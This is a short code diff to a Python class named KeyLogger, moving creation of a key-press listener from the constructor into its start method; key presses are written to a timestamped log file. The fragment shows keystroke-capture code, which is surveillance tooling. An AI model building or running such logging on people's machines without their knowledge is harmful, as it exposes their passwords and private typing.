@@ -15,8 +15,6 @@ class KeyLogger:
 
         self.keylog_filename = keylog_filename
         
-        self.listener = Listener(on_press=_keypress_callback)
-
         logging.basicConfig(filename=(self.keylog_filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
@@ -35,5 +33,5 @@ class KeyLogger:
         """
         Starts logging key presses
         """
-
-        self.listener.start()
+        listener = Listener(on_press=_keypress_callback)
+        listener.start()
